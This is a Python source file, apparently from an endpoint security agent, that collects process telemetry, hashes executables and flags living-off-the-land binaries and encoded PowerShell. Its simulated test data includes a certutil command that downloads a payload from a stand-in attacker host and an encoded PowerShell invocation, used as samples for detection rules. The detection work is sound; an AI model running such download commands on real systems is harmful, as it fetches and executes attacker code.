"""
KAVACH Process Collector.

Collects running process information including:
- PID, PPID, user, command line, status
- CPU/memory usage
- File hashes (SHA256, MD5) of executables
- LOLBin detection
- Suspicious behaviour flags
"""

from __future__ import annotations

import asyncio
import hashlib
import os
import random
import socket
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from collectors.base import BaseCollector, TelemetryEvent
from core.constants import (
    CollectorName,
    EventType,
    Severity,
    LOLBINS,
    SUSPICIOUS_EXTENSIONS,
)
from core.logging import get_logger

logger = get_logger(__name__)


class ProcessCollector(BaseCollector):
    """Collects detailed process telemetry from the operating system."""

    name = CollectorName.PROCESS
    description = "Running process enumeration with hashes, parent/child trees, and LOLBin detection"

    async def _collect_real(self) -> list[TelemetryEvent]:
        """Collect real process data using psutil."""
        import psutil  # type: ignore[import-untyped]

        events: list[TelemetryEvent] = []
        loop = asyncio.get_event_loop()

        for proc in psutil.process_iter(
            ["pid", "ppid", "name", "username", "cmdline", "exe",
             "status", "create_time", "cpu_percent", "memory_info",
             "num_threads"]
        ):
            try:
                info = proc.info
                exe_path = info.get("exe") or ""
                proc_name = (info.get("name") or "").lower()
                cmdline = info.get("cmdline") or []
                cmdline_str = " ".join(cmdline) if cmdline else ""

                # Compute hashes for the executable
                hashes: dict[str, str] = {}
                if exe_path and os.path.isfile(exe_path):
                    try:
                        hashes = await loop.run_in_executor(
                            None, self._compute_hashes, exe_path
                        )
                    except (PermissionError, OSError):
                        pass

                # Detect LOLBin usage
                is_lolbin = proc_name in LOLBINS
                severity = Severity.INFO
                risk = 0.0
                tags: list[str] = []

                if is_lolbin:
                    severity = Severity.MEDIUM
                    risk = 45.0
                    tags.append("lolbin")

                # Detect encoded PowerShell commands
                if proc_name in ("powershell.exe", "pwsh.exe"):
                    if any(
                        flag in cmdline_str.lower()
                        for flag in ["-enc", "-encodedcommand", "-e "]
                    ):
                        severity = Severity.HIGH
                        risk = 75.0
                        tags.append("encoded_command")

                # Memory info
                mem = info.get("memory_info")
                memory_rss = mem.rss if mem else 0

                # Network connections count
                net_connections = 0
                try:
                    conns = proc.net_connections()
                    net_connections = len(conns)
                except (psutil.AccessDenied, AttributeError, psutil.NoSuchProcess):
                    pass

                event = self._create_event(
                    EventType.PROCESS_CREATE,
                    severity=severity.value,
                    risk_score=risk,
                    username=info.get("username"),
                    tags=tags,
                    metadata={
                        "pid": info["pid"],
                        "ppid": info.get("ppid"),
                        "name": info.get("name"),
                        "exe": exe_path,
                        "cmdline": cmdline_str,
                        "status": info.get("status"),
                        "create_time": (
                            datetime.fromtimestamp(
                                info["create_time"], tz=timezone.utc
                            ).isoformat()
                            if info.get("create_time")
                            else None
                        ),
                        "cpu_percent": info.get("cpu_percent", 0.0),
                        "memory_rss": memory_rss,
                        "num_threads": info.get("num_threads", 0),
                        "network_connections": net_connections,
                        "hashes": hashes,
                        "is_lolbin": is_lolbin,
                    },
                )
                events.append(event)

            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue

        logger.debug("processes_collected", count=len(events))
        return events

    async def _collect_simulated(self) -> list[TelemetryEvent]:
        """Generate simulated process data."""
        simulated_processes = [
            {
                "pid": 4, "ppid": 0, "name": "System",
                "exe": "C:\\Windows\\System32\\ntoskrnl.exe",
                "cmdline": "", "username": "SYSTEM",
                "status": "running", "cpu_percent": 0.5,
                "memory_rss": 142_000_000, "is_lolbin": False,
            },
            {
                "pid": 1024, "ppid": 700, "name": "svchost.exe",
                "exe": "C:\\Windows\\System32\\svchost.exe",
                "cmdline": "svchost.exe -k netsvcs -p",
                "username": "NT AUTHORITY\\SYSTEM",
                "status": "running", "cpu_percent": 1.2,
                "memory_rss": 45_000_000, "is_lolbin": False,
            },
            {
                "pid": 5678, "ppid": 1024, "name": "powershell.exe",
                "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmdline": "powershell.exe -EncodedCommand SQBFAFgA",
                "username": "DESKTOP-USER\\admin",
                "status": "running", "cpu_percent": 15.0,
                "memory_rss": 90_000_000, "is_lolbin": True,
            },
            {
                "pid": 3456, "ppid": 1024, "name": "explorer.exe",
                "exe": "C:\\Windows\\explorer.exe",
                "cmdline": "explorer.exe", "username": "DESKTOP-USER\\admin",
                "status": "running", "cpu_percent": 2.0,
                "memory_rss": 75_000_000, "is_lolbin": False,
            },
            {
                "pid": 7890, "ppid": 5678, "name": "certutil.exe",
                "exe": "C:\\Windows\\System32\\certutil.exe",
                "cmdline": "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
                "username": "DESKTOP-USER\\admin",
                "status": "running", "cpu_percent": 5.0,
                "memory_rss": 20_000_000, "is_lolbin": True,
            },
        ]

        events: list[TelemetryEvent] = []
        for proc in simulated_processes:
            name_lower = proc["name"].lower()
            is_lolbin = name_lower in LOLBINS
            severity = Severity.INFO
            risk = 0.0
            tags: list[str] = ["simulated"]

            if is_lolbin:
                severity = Severity.MEDIUM
                risk = 45.0
                tags.append("lolbin")

            cmdline = proc.get("cmdline", "")
            if name_lower in ("powershell.exe", "pwsh.exe") and "-encodedcommand" in cmdline.lower():
                severity = Severity.HIGH
                risk = 75.0
                tags.append("encoded_command")

            if "certutil" in name_lower and "urlcache" in cmdline.lower():
                severity = Severity.HIGH
                risk = 80.0
                tags.append("suspicious_download")

            event = self._create_event(
                EventType.PROCESS_CREATE,
                severity=severity.value,
                risk_score=risk,
                username=proc.get("username"),
                tags=tags,
                metadata={
                    "pid": proc["pid"],
                    "ppid": proc["ppid"],
                    "name": proc["name"],
                    "exe": proc["exe"],
                    "cmdline": cmdline,
                    "status": proc["status"],
                    "cpu_percent": proc["cpu_percent"],
                    "memory_rss": proc["memory_rss"],
                    "is_lolbin": is_lolbin,
                    "hashes": {
                        "sha256": hashlib.sha256(proc["name"].encode()).hexdigest(),
                        "md5": hashlib.md5(proc["name"].encode()).hexdigest(),
                    },
                },
            )
            events.append(event)

        return events

    @staticmethod
    def _compute_hashes(filepath: str) -> dict[str, str]:
        """Compute SHA256 and MD5 of a file."""
        sha256 = hashlib.sha256()
        md5 = hashlib.md5()
        with open(filepath, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b""):
                sha256.update(chunk)
                md5.update(chunk)
        return {"sha256": sha256.hexdigest(), "md5": md5.hexdigest()}
